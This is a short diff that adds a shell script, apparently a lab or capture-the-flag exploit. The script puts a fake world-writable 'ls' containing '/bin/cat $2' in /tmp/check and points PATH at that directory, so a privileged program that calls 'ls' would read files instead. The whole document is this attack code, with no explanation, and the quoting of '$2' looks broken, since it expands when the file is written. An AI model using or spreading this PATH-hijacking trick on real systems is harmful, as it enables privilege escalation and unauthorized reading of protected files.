@@ -1,0 +1,7 @@
+cd /tmp
+mkdir check
+cd check
+touch ls
+chmod 777 ls
+echo "/bin/cat $2" > ls
+export PATH="/tmp/check"
